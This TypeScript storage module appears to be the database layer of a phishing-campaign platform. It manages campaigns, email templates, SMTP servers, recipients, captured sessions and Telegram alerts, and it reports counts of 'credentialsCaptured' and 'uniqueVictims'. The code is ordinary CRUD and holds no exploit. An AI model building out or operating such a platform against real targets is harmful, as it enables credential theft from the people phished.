import { 
  users, campaigns, emailTemplates, smtpServers, recipients, sessions, campaignAssets, telegramSettings, alertSettings, abTests,
  type User, type InsertUser, type Campaign, type InsertCampaign, type EmailTemplate, type InsertEmailTemplate,
  type SmtpServer, type InsertSmtpServer, type Recipient, type InsertRecipient, type Session, type InsertSession,
  type CampaignAsset, type InsertCampaignAsset, type TelegramSettings, type InsertTelegramSettings,
  type ABTest, type InsertABTest
} from "@shared/schema";
import { db } from "./db";
import { eq, desc, count, and } from "drizzle-orm";

export interface IStorage {
  // Users
  getUser(id: string): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  updateUserPassword(id: string, password: string): Promise<void>;
  getAllUsers(): Promise<User[]>;
  updateUser(id: string, userData: Partial<User>): Promise<User>;
  deleteUser(id: string): Promise<void>;
  toggleUserStatus(id: string, isActive: boolean): Promise<User>;

  // Campaigns
  getCampaigns(userId: string): Promise<Campaign[]>;
  getCampaign(id: string): Promise<Campaign | undefined>;
  createCampaign(campaign: InsertCampaign & { userId: string }): Promise<Campaign>;
  updateCampaign(id: string, campaign: Partial<InsertCampaign>): Promise<Campaign | undefined>;
  deleteCampaign(id: string): Promise<void>;

  // Email Templates
  getEmailTemplates(userId: string): Promise<EmailTemplate[]>;
  getEmailTemplate(id: string): Promise<EmailTemplate | undefined>;
  createEmailTemplate(template: InsertEmailTemplate & { userId: string }): Promise<EmailTemplate>;
  updateEmailTemplate(id: string, template: Partial<InsertEmailTemplate>): Promise<EmailTemplate | undefined>;
  deleteEmailTemplate(id: string): Promise<void>;

  // SMTP Servers
  getSmtpServers(): Promise<SmtpServer[]>;
  getSmtpServersByUserId(userId: string): Promise<SmtpServer[]>;
  getSmtpServerById(id: string): Promise<SmtpServer | undefined>;
  getActiveSmtpServer(userId: string): Promise<SmtpServer | undefined>;
  createSmtpServer(server: InsertSmtpServer & { userId: string }): Promise<SmtpServer>;
  updateSmtpServer(id: string, server: Partial<InsertSmtpServer>): Promise<SmtpServer | undefined>;
  deleteSmtpServer(id: string): Promise<void>;
  setActiveSmtpServer(userId: string, serverId: string): Promise<void>;

  // Recipients
  getRecipients(campaignId: string): Promise<Recipient[]>;
  createRecipient(recipient: InsertRecipient): Promise<Recipient>;
  updateRecipient(id: string, recipient: Partial<InsertRecipient>): Promise<Recipient | undefined>;
  bulkCreateRecipients(recipients: InsertRecipient[]): Promise<Recipient[]>;

  // Sessions
  getSessions(userId?: string, campaignId?: string): Promise<Session[]>;
  getSession(id: string): Promise<Session | undefined>;
  createSession(session: InsertSession): Promise<Session>;
  updateSession(id: string, session: Partial<InsertSession>): Promise<Session | undefined>;
  getSessionStats(userId?: string): Promise<{
    totalSessions: number;
    credentialsCaptured: number;
    completeSessions: number;
    uniqueVictims: number;
  }>;

  // Campaign Assets
  getCampaignAssets(campaignId: string): Promise<CampaignAsset[]>;
  createCampaignAsset(asset: InsertCampaignAsset): Promise<CampaignAsset>;
  deleteCampaignAsset(id: string): Promise<void>;

  // Telegram Settings
  getTelegramSettings(userId: string): Promise<TelegramSettings | undefined>;
  upsertTelegramSettings(settings: InsertTelegramSettings & { userId: string }): Promise<TelegramSettings>;

  // Alert Settings
  getAlertSettings(userId: string): Promise<any>;
  updateAlertSettings(userId: string, settings: any): Promise<any>;

  // A/B Tests
  getABTests(userId: string): Promise<ABTest[]>;
  getABTest(id: string): Promise<ABTest | undefined>;
  createABTest(test: InsertABTest & { userId: string }): Promise<ABTest>;
  updateABTest(id: string, test: Partial<InsertABTest>): Promise<ABTest | undefined>;
  deleteABTest(id: string): Promise<void>;
}

export class DatabaseStorage implements IStorage {
  // Users
  async getUser(id: string): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.id, id));
    return user || undefined;
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.username, username));
    return user || undefined;
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const [user] = await db.insert(users).values(insertUser).returning();
    return user;
  }

  async updateUserPassword(id: string, password: string): Promise<void> {
    await db.update(users).set({ password }).where(eq(users.id, id));
  }

  async getAllUsers(): Promise<User[]> {
    return await db.select().from(users);
  }

  async updateUser(id: string, userData: Partial<User>): Promise<User> {
    const [updatedUser] = await db.update(users)
      .set(userData)
      .where(eq(users.id, id))
      .returning();
    return updatedUser;
  }

  async deleteUser(id: string): Promise<void> {
    await db.delete(users).where(eq(users.id, id));
  }

  async toggleUserStatus(id: string, isActive: boolean): Promise<User> {
    const [updatedUser] = await db.update(users)
      .set({ isActive })
      .where(eq(users.id, id))
      .returning();
    return updatedUser;
  }

  // Campaigns
  async getCampaigns(userId: string): Promise<Campaign[]> {
    return await db.select().from(campaigns).where(eq(campaigns.userId, userId)).orderBy(desc(campaigns.createdAt));
  }

  async getCampaign(id: string): Promise<Campaign | undefined> {
    const [campaign] = await db.select().from(campaigns).where(eq(campaigns.id, id));
    return campaign || undefined;
  }

  async createCampaign(campaign: InsertCampaign & { userId: string }): Promise<Campaign> {
    const [newCampaign] = await db.insert(campaigns).values(campaign).returning();
    return newCampaign;
  }

  async updateCampaign(id: string, campaign: Partial<InsertCampaign>): Promise<Campaign | undefined> {
    const [updated] = await db.update(campaigns).set(campaign).where(eq(campaigns.id, id)).returning();
    return updated || undefined;
  }

  async deleteCampaign(id: string): Promise<void> {
    await db.delete(campaigns).where(eq(campaigns.id, id));
  }

  // Email Templates
  async getEmailTemplates(userId: string): Promise<EmailTemplate[]> {
    return await db.select().from(emailTemplates).where(eq(emailTemplates.userId, userId)).orderBy(desc(emailTemplates.createdAt));
  }

  async getEmailTemplate(id: string): Promise<EmailTemplate | undefined> {
    const [template] = await db.select().from(emailTemplates).where(eq(emailTemplates.id, id));
    return template || undefined;
  }

  async createEmailTemplate(template: InsertEmailTemplate & { userId: string }): Promise<EmailTemplate> {
    const [newTemplate] = await db.insert(emailTemplates).values(template).returning();
    return newTemplate;
  }

  async updateEmailTemplate(id: string, template: Partial<InsertEmailTemplate>): Promise<EmailTemplate | undefined> {
    const [updated] = await db.update(emailTemplates).set(template).where(eq(emailTemplates.id, id)).returning();
    return updated || undefined;
  }

  async deleteEmailTemplate(id: string): Promise<void> {
    await db.delete(emailTemplates).where(eq(emailTemplates.id, id));
  }

  // SMTP Servers
  async getSmtpServers(): Promise<SmtpServer[]> {
    return await db.select().from(smtpServers).orderBy(desc(smtpServers.createdAt));
  }

  async getSmtpServersByUserId(userId: string): Promise<SmtpServer[]> {
    return await db.select().from(smtpServers).where(eq(smtpServers.userId, userId)).orderBy(desc(smtpServers.createdAt));
  }

  async getSmtpServerById(id: string): Promise<SmtpServer | undefined> {
    const [server] = await db.select().from(smtpServers).where(eq(smtpServers.id, id));
    return server || undefined;
  }

  async getActiveSmtpServer(userId: string): Promise<SmtpServer | undefined> {
    const [server] = await db.select().from(smtpServers).where(and(eq(smtpServers.userId, userId), eq(smtpServers.isActive, true)));
    return server || undefined;
  }

  async createSmtpServer(server: InsertSmtpServer & { userId: string }): Promise<SmtpServer> {
    const [newServer] = await db.insert(smtpServers).values(server).returning();
    return newServer;
  }

  async updateSmtpServer(id: string, server: Partial<InsertSmtpServer>): Promise<SmtpServer | undefined> {
    const [updated] = await db.update(smtpServers).set(server).where(eq(smtpServers.id, id)).returning();
    return updated || undefined;
  }

  async deleteSmtpServer(id: string): Promise<void> {
    await db.delete(smtpServers).where(eq(smtpServers.id, id));
  }

  async setActiveSmtpServer(userId: string, serverId: string): Promise<void> {
    // Deactivate all servers for this user
    await db.update(smtpServers).set({ isActive: false }).where(eq(smtpServers.userId, userId));
    // Activate the selected server
    await db.update(smtpServers).set({ isActive: true }).where(eq(smtpServers.id, serverId));
  }

  // Recipients
  async getRecipients(campaignId: string): Promise<Recipient[]> {
    return await db.select().from(recipients).where(eq(recipients.campaignId, campaignId));
  }

  async createRecipient(recipient: InsertRecipient): Promise<Recipient> {
    const [newRecipient] = await db.insert(recipients).values(recipient).returning();
    return newRecipient;
  }

  async updateRecipient(id: string, recipient: Partial<InsertRecipient>): Promise<Recipient | undefined> {
    const [updated] = await db.update(recipients).set(recipient).where(eq(recipients.id, id)).returning();
    return updated || undefined;
  }

  async bulkCreateRecipients(recipientsList: InsertRecipient[]): Promise<Recipient[]> {
    if (recipientsList.length === 0) return [];
    return await db.insert(recipients).values(recipientsList).returning();
  }

  // Sessions
  async getSessions(userId?: string, campaignId?: string): Promise<Session[]> {
    if (campaignId) {
      return await db.select().from(sessions)
        .where(eq(sessions.campaignId, campaignId))
        .orderBy(desc(sessions.createdAt));
    } else if (userId) {
      // Get user's campaign IDs first
      const userCampaigns = await db.select({ id: campaigns.id }).from(campaigns).where(eq(campaigns.userId, userId));
      const campaignIds = userCampaigns.map(c => c.id);
      
      if (campaignIds.length === 0) return [];
      
      return await db.select().from(sessions)
        .where(eq(sessions.campaignId, campaignIds[0])) // Simplify for now
        .orderBy(desc(sessions.createdAt));
    }
    
    return await db.select().from(sessions).orderBy(desc(sessions.createdAt));
  }

  async getSession(id: string): Promise<Session | undefined> {
    const [session] = await db.select().from(sessions).where(eq(sessions.id, id));
    return session || undefined;
  }

  async createSession(session: InsertSession): Promise<Session> {
    const [newSession] = await db.insert(sessions).values(session).returning();
    return newSession;
  }

  async updateSession(id: string, session: Partial<InsertSession>): Promise<Session | undefined> {
    const [updated] = await db.update(sessions).set(session).where(eq(sessions.id, id)).returning();
    return updated || undefined;
  }

  async getSessionStats(userId?: string): Promise<{
    totalSessions: number;
    credentialsCaptured: number;
    completeSessions: number;
    uniqueVictims: number;
  }> {
    // Simplified approach to avoid complex join type issues
    let sessionsList: Session[] = [];
    
    if (userId) {
      sessionsList = await this.getSessions(userId);
    } else {
      sessionsList = await this.getSessions();
    }

    const totalSessions = sessionsList.length;
    const credentialsCaptured = sessionsList.filter(s => s.status === 'complete' && s.completionPercentage === 100).length;
    const completeSessions = sessionsList.filter(s => s.status === 'complete').length;
    const uniqueIps = new Set(sessionsList.map(s => s.ipAddress)).size;

    return {
      totalSessions,
      credentialsCaptured,
      completeSessions,
      uniqueVictims: uniqueIps,
    };
  }

  // Campaign Assets
  async getCampaignAssets(campaignId: string): Promise<CampaignAsset[]> {
    return await db.select().from(campaignAssets).where(eq(campaignAssets.campaignId, campaignId));
  }

  async createCampaignAsset(asset: InsertCampaignAsset): Promise<CampaignAsset> {
    const [newAsset] = await db.insert(campaignAssets).values(asset).returning();
    return newAsset;
  }

  async deleteCampaignAsset(id: string): Promise<void> {
    await db.delete(campaignAssets).where(eq(campaignAssets.id, id));
  }

  // Telegram Settings
  async getTelegramSettings(userId: string): Promise<TelegramSettings | undefined> {
    const [settings] = await db.select().from(telegramSettings).where(eq(telegramSettings.userId, userId));
    return settings || undefined;
  }

  async upsertTelegramSettings(settings: InsertTelegramSettings & { userId: string }): Promise<TelegramSettings> {
    const existing = await this.getTelegramSettings(settings.userId);
    
    if (existing) {
      const [updated] = await db.update(telegramSettings)
        .set(settings)
        .where(eq(telegramSettings.userId, settings.userId))
        .returning();
      return updated;
    } else {
      const [newSettings] = await db.insert(telegramSettings).values(settings).returning();
      return newSettings;
    }
  }

  // Alert Settings
  async getAlertSettings(userId: string): Promise<any> {
    const [settings] = await db.select().from(alertSettings).where(eq(alertSettings.userId, userId));
    return settings || null;
  }

  async updateAlertSettings(userId: string, settingsData: any): Promise<any> {
    const existing = await this.getAlertSettings(userId);
    
    if (existing) {
      const [updated] = await db.update(alertSettings)
        .set(settingsData)
        .where(eq(alertSettings.userId, userId))
        .returning();
      return updated;
    } else {
      const [newSettings] = await db.insert(alertSettings).values({
        ...settingsData,
        userId,
      }).returning();
      return newSettings;
    }
  }

  // A/B Tests
  async getABTests(userId: string): Promise<ABTest[]> {
    return await db.select().from(abTests).where(eq(abTests.userId, userId)).orderBy(desc(abTests.createdAt));
  }

  async getABTest(id: string): Promise<ABTest | undefined> {
    const [test] = await db.select().from(abTests).where(eq(abTests.id, id));
    return test || undefined;
  }

  async createABTest(test: InsertABTest & { userId: string }): Promise<ABTest> {
    const [newTest] = await db.insert(abTests).values(test).returning();
    return newTest;
  }

  async updateABTest(id: string, test: Partial<InsertABTest>): Promise<ABTest | undefined> {
    const [updated] = await db.update(abTests).set(test).where(eq(abTests.id, id)).returning();
    return updated || undefined;
  }

  async deleteABTest(id: string): Promise<void> {
    await db.delete(abTests).where(eq(abTests.id, id));
  }
}

export const storage = new DatabaseStorage();
